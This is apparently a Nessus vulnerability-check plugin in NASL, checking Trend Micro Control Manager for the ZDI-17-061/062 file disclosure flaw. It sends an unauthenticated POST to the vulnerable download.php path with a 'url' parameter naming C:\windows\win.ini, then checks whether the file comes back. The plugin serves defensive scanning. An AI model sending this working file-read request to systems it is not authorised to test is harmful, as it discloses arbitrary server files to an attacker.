#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(97224);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2017/02/21 14:37:42 $");

  script_osvdb_id(151641);
  script_xref(name:"ZDI", value:"ZDI-17-061");
  script_xref(name:"ZDI", value:"ZDI-17-062");

  script_name(english:"Trend Micro Control Manager download.php File Disclosure");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"An application running on the remote host is affected by a file
disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Trend Micro Control Manager running on the remote host
is affected by a file disclosure vulnerability due to a failure to
properly sanitize user-supplied input to the download.php script. An
unauthenticated, remote attacker can exploit this, via a crafted
request employing directory traversal, to disclose arbitrary files.

Note that the application is reportedly affected by other
vulnerabilities; however, Nessus has not tested for these issues.");
  script_set_attribute(attribute:"see_also", value:"https://success.trendmicro.com/solution/1116624");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-17-061/");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-17-062/");
  script_set_attribute(attribute:"solution", value:
"The vendor advisory says Control Manager version 6.0 build 3444 has
fixed the issue, but it appears that an early version 6.0 build 3400
(Service Pack 3, Patch 2) also fixed the issue. Please contact the
vendor for determining the first fixed version. 

Also note that some older versions of the application do not have the
download.php script and are therefore not affected.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/02/07");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/02/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/02/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:trend_micro:control_manager");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017 Tenable Network Security, Inc.");

  script_dependencies("trendmicro_control_manager_detect_unauth.nbin");
  script_require_keys("installed_sw/Trend Micro Control Manager");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Trend Micro Control Manager";

# Exit if TMCM is not detected on the target
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:443, php:TRUE);

# Exit if TMCM is not detected on the port
install = get_single_install(
  app_name : app,
  port     : port
);

files = make_list('C:\\windows\\win.ini', 'C:\\winnt\\win.ini');

file_pats = make_array();
file_pats['C:\\winnt\\win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['C:\\windows\\win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";

vuln = FALSE;
url = "/WebApp/widget/repository/widgetPool/wp1/widgetBase/modTMLS/download.php";

foreach file (files)
{
  res = http_send_recv3(
    method : "POST",
    port   : port,
    item   : url,
    data   : "filename=nessus&url=" + file,
    content_type: 'application/x-www-form-urlencoded',
    exit_on_fail : TRUE
  );
  req = http_last_sent_request();

  if (egrep(pattern:file_pats[file], string:res[2]))
  {
    vuln = TRUE;
    break;
  }
}
if (!vuln)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:install['path'], port:port));

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  file        : file,
  request     : make_list(req),
  output      : chomp(res[2]),
  attach_type : 'text/plain'
);

